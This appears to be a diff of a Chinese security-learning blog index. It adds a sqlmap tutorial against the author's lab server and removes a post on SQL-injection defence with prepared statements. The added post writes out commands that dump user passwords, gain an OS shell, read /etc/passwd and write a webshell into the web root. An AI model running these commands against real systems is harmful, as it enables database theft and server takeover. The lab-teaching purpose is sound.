@@ -174,6 +174,144 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chengstery.top/2023/12/05/SQL%E6%B3%A8%E5%85%A5-SQLMap%E5%B7%A5%E5%85%B7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="stery">
+      <meta itemprop="description" content="选择有时候比努力更重要">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="chengstery">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/12/05/SQL%E6%B3%A8%E5%85%A5-SQLMap%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">SQL注入-SQLMap工具</a>
+        </h2>
+
+        <div class="post-meta">
+		
+		  
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-12-05 23:43:57 / 修改时间：23:43:53" itemprop="dateCreated datePublished" datetime="2023-12-05T23:43:57+08:00">2023-12-05</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">SQL注入</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p>用这个工具扫描其它网站时，要注意法律问题，同时也比较慢，所以我们以之前写的<a href="https://chengstery.top/2023/12/02/%E5%AD%A6%E4%B9%A0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%AD%A6%E5%89%8D%E5%87%86%E5%A4%87-4/">登录页面</a>为例子扫描。</p>
+</blockquote>
+<h1 id="一-SQLMap拖库"><a href="#一-SQLMap拖库" class="headerlink" title="一  SQLMap拖库"></a>一  SQLMap拖库</h1><p>SQLMap可以完成注入点的发现、数据库类型的确认、webshell权限和、路径的确认和拖库等一系列功能。<br>测试的Payload分为五级:Leve l~1-Level 5</p>
+<ol>
+<li><p>当我们发现注入点</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.88.130/security/read.php?id=1&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看所有的数据库</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.88.130/security/read.php?id=1&quot; --dbs</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看当前数据库</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.88.130/security/read.php?id=1&quot; --current-db</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>发现使用的是learn数据库，接下来对数据库进行查询</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.88.130/security/read.php?id=1&quot; --tables -D &quot;learn&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查出所有表后，对user表的列名查询</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.88.130/security/read.php?id=1&quot; --columns -T &quot;users&quot; -D &quot;learn&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>user表的列名知道后直接查出所有数据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.88.130/security/read.php?id=1&quot; --dump -C &quot;userid,username,password&quot; </span><br><span class="line">-T &quot;users&quot; -D &quot;learn&quot;</span><br></pre></td></tr></table></figure>
+<p>完成拖库后，可以直接输出看到表的数据，也可以直接根据提示信息进入相应文件查看</p>
+</li>
+<li><p>直接指定数据库类型，节省时间</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.88.130/security/read.php?id=1&quot; --dbs --dbms=mysql</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>判断是否是DBA(是否具有管理员权限)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.88.130/security/read.php?id=1&quot; --dbms=mysql --is-dba</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="二-POST和Cookie"><a href="#二-POST和Cookie" class="headerlink" title="二  POST和Cookie"></a>二  POST和Cookie</h1><ol>
+<li><p>如果某个注入点需要先登录，那么手工登录，使用相同的Cookie进行处理</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.88.130/security/read.php?id=1&quot; </span><br><span class="line">--cookie=PHPSESSID=&quot;6j55ei1ahv1rh7c0sb0e24eee1&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果注入点不是GET请求，而是POST请求，则要添加POST正文</p>
+</li>
+</ol>
+<p>先将POST请求在Burp中捕获，将请求内容保存到文件中。<br>内容通常为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /security/read.php HTTP/1.1</span><br><span class="line">Host: 192.168.88.130</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Origin: http://192.168.88.130</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.88.130/security/temp/mm.php</span><br><span class="line">Cookie: PHPSESSID=s76jr020o740cgbre9scnj4oah</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">id=6</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>运行SQLMap时，通过-r参数指定文件，同时通过-p参数明确指定参数名（上述请求参数为id），实现注入<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r ./sql-post.txt -p id --dbs</span><br></pre></td></tr></table></figure>
+由于URL地址已经在sql-post.txt的请求内容中，所以不需要指定-u参数。如果不通过-p指定id参数，则SQLMap会尝试对所有参数进行注入测试。如id&#x3D;12345&amp;name&#x3D;fjc&amp;addr&#x3D;guangzhou,此处三个参数都会被尝试</li>
+</ol>
+<h1 id="三-OS-Shell"><a href="#三-OS-Shell" class="headerlink" title="三  OS-Shell"></a>三  OS-Shell</h1><ol>
+<li><strong>整个过程分为三部分:</strong></li>
+</ol>
+<p>(1) 猜测网站的绝对路径<br>(2) 尝试植入木马<br>(3) 获取到Shell命令行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r ./sql-post.txt -p id --cookie=&quot;PHPSESSID=s76jr020o740cgbre9scnj4oah&quot; --dbms=mysql --os-shell</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://192.168.88.130/security/read.php?id=1&quot; --cookie=&quot;PHPSESSID=s76jr020o740cgbre9scnj4oah&quot; --dbms=mysql --os-shell  </span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><strong>手工读写文件</strong><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">读取远程服务器的文件</span></span><br><span class="line">sqlmap -r ./sql-post.txt -p id --cookie=&quot;PHPSESSID=s76jr020o740cgbre9scnj4oah&quot; --dbms=mysql --file-read &quot;/etc/passwd&quot;</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://192.168.88.130/security/read.php?id=1&quot; --cookie=&quot;PHPSESSID=s76jr020o740cgbre9scnj4oah&quot; --dbms=mysql --file-read &quot;/etc/passwd&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当SQL不能自动完成木马植入时，可以使用此命令进行手工植入:</span></span><br><span class="line">sqlmap -r ./sql-post.txt -p id --cookie=&quot;PHPSESSID=s76jr020o740cgbre9scnj4oah&quot; --dbms=mysql --file-write ./mm.php --file-dest /opt/lampp/htdocs/security/temp/mm.php</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://192.168.88.130/security/read.php?id=1&quot; --cookie=&quot;PHPSESSID=s76jr020o740cgbre9scnj4oah&quot; --dbms=mysql --file-write ./mm.php --file-dest /opt/lampp/htdocs/security/temp/mm.php</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此时也可以使用Python调用sqlmap命令(os.popen(<span class="string">&quot;&quot;</span>).<span class="built_in">read</span>())进行盲猜，循环遍历字典文件</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--bbatch参数可以一次性运行完，SQLMap中途不会询问（非交互模式），按照默认设置</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+	
+	
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://chengstery.top/2023/12/05/SQL%E6%B3%A8%E5%85%A5-%E5%85%B6%E4%BB%96%E6%B3%A8%E5%85%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1154,118 +1292,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://chengstery.top/2023/12/04/SQL%E6%B3%A8%E5%85%A5-%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E6%8A%A4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="stery">
-      <meta itemprop="description" content="选择有时候比努力更重要">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="chengstery">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/12/04/SQL%E6%B3%A8%E5%85%A5-%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E6%8A%A4/" class="post-title-link" itemprop="url">SQL注入-登录漏洞-SQL注入防护</a>
-        </h2>
-
-        <div class="post-meta">
-		
-		  
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-12-04 22:59:12 / 修改时间：23:09:31" itemprop="dateCreated datePublished" datetime="2023-12-04T22:59:12+08:00">2023-12-04</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">SQL注入</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>5.4k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>5 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
-<p>在<a href="https://chengstery.top/2023/12/03/SQL%E6%B3%A8%E5%85%A5-%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E4%BF%AE%E5%A4%8D/">SQL注入-登录漏洞-基础修复</a>中我们提到这个登录页面是存在SQL漏洞的，接下来我们将说说怎么进行SQL注入防护。同时我们还会说到如何防止暴力破解。</p>
-</blockquote>
-<h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>登录漏洞：登录界面可以进行SQL注入，轻易实现登录（高）<br>1、 从代码和SQL语句的逻辑层面进行考虑，让密码对比不轻易失效<br>2、 基于将用户输入的引号（单引号和双引号）进行转义处理的前提，可以用PHP的内置函数addslashes进行强制转义<br>另一种方法：可以使用MySQLi的预处理功能达到防SQL注入的目的。</p>
-<h2 id="一、登录SQL语句的逻辑问题"><a href="#一、登录SQL语句的逻辑问题" class="headerlink" title="一、登录SQL语句的逻辑问题"></a>一、登录SQL语句的逻辑问题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//先查用户名对比密码</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from users where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;SQL语句执行错误&quot;</span>);   <span class="comment">//result获取到的查询结果，称为结果集</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//修复的代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//认证和授权失败</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>) == <span class="number">1</span>)&#123;</span><br><span class="line">  <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line">  <span class="comment">//var_dump($row);  //打印</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$md5password</span> == <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;login-pass&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//登录成功后，记录SESSION变量</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;islogin&#x27;</span>] = <span class="string">&#x27;true&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;welcome.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;login-fail&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;login.html&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">  &#125;   </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;login-fail&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;login.html&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="二、使用addslashes函数"><a href="#二、使用addslashes函数" class="headerlink" title="二、使用addslashes函数"></a>二、使用addslashes函数</h2><p>addslashes函数可以将字符串中的单引号、双引号、反斜杠、NULL值自动添加转义字符，从而防止SQL注入中对单引号和双引号的预防。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">原始SQL语句如下:</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from users where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$md5password</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">如果用户输入x<span class="string">&#x27; or userid=1#,则SQL语句变成：</span></span><br><span class="line"><span class="string">$sql = &quot;select * from users where username=&#x27;</span>x<span class="string">&#x27; or userid=1#&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;$md5password&#x27;</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如果使用addslashes函数强制将用户输入的引号添加转义符，则变成:</span></span><br><span class="line"><span class="string"><span class="subst">$sql</span> = &quot;</span>select * <span class="keyword">from</span> users where username=<span class="string">&#x27;x\&#x27; or userid=1#&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;$md5password&#x27;</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">上述SQL语句用户名为：x\&#x27; or userid=1#</span></span><br></pre></td></tr></table></figure>
-<h2 id="三、使用mysqli面向对象方式"><a href="#三、使用mysqli面向对象方式" class="headerlink" title="三、使用mysqli面向对象方式"></a>三、使用mysqli面向对象方式</h2><p><strong>1.面向过程</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;你的数据库密码&#x27;</span>,<span class="string">&#x27;learn&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;数据库连接不成功.&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select articleid,author,headline,viewcount,createtime from article where isDelete=1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将数据库查询到的结果集中的数据取出，保存到一个数组中</span></span><br><span class="line"><span class="comment">//$rows = mysqli_fetch_all($result);</span></span><br><span class="line"><span class="comment">//mysqli_fetch_all  默认使用索引数组，也可以设定参数强制使用关联数组</span></span><br><span class="line"><span class="variable">$rows</span> = <span class="title function_ invoke__">mysqli_fetch_all</span>(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历结果集数据并输出到页面中</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$rows</span> <span class="keyword">as</span> <span class="variable">$row</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="number">0</span>] . <span class="string">&#x27;-&#x27;</span> . <span class="variable">$row</span>[<span class="number">1</span>] . <span class="string">&#x27;-&#x27;</span> . <span class="variable">$row</span>[<span class="number">2</span>] . <span class="string">&#x27;-&#x27;</span> . <span class="variable">$row</span>[<span class="number">3</span>] . <span class="string">&#x27;-&#x27;</span> . <span class="variable">$row</span>[<span class="number">4</span>] . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><strong>2.面向对象方式</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用mysqli面向对象方式连接数据库</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_connection_oop</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//连接数据库</span></span><br><span class="line">    <span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;你的数据库密码&#x27;</span>,<span class="string">&#x27;learn&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;数据库连接不成功.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置编码格式的两种方式</span></span><br><span class="line">    <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line">    <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">set_charset</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$conn</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="四、使用mysql预处理功能"><a href="#四、使用mysql预处理功能" class="headerlink" title="四、使用mysql预处理功能"></a>四、使用mysql预处理功能</h2><h3 id="1、-预处理功能的使用"><a href="#1、-预处理功能的使用" class="headerlink" title="1、  预处理功能的使用"></a>1、  预处理功能的使用</h3><p>预处理过程就是先把SQL语句交给MySQL数据库处理</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MySQLi预处理功能（面向对象）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysqli_prepare_stmt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$conn</span> = <span class="title function_ invoke__">create_connection_oop</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//?在预处理语句中用于代替参数</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;update users set username = ? where userid = ?&quot;</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="comment">//实例化Prepared Statement与处理对象</span></span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="comment">//实例化后需要将参数值进行绑定并在执行时替换</span></span><br><span class="line">    <span class="comment">//bind_param第一个参数是数据类型  i:整数，s:字符串，d:小数,b:二进制</span></span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;si&quot;</span>,<span class="variable">$username</span>,<span class="variable">$userid</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="string">&#x27;hahasb&#x27;</span>;</span><br><span class="line">    <span class="variable">$userid</span> = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//正式执行SQL语句</span></span><br><span class="line">    <span class="comment">//$stmt-&gt;execute();   //execute()返回布尔类型</span></span><br><span class="line">    <span class="comment">//$conn-&gt;commit();    //默认情况下，更新操作会自动提交，也可手工处理</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果针对查询语句需进行结果绑定</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from users where userid &lt; ?&quot;</span>;  </span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;i&quot;</span>,<span class="variable">$userid</span>);</span><br><span class="line">    <span class="variable">$userid</span> = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//绑定结果参数</span></span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$userid</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$role</span>,<span class="variable">$avatar</span>,<span class="variable">$createtime</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用结果并处理</span></span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//输出行数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$stmt</span>-&gt;affected_rows . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$stmt</span>-&gt;num_rows . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//遍历结果</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$userid</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysqli_prepare_stmt</span>();</span><br></pre></td></tr></table></figure>
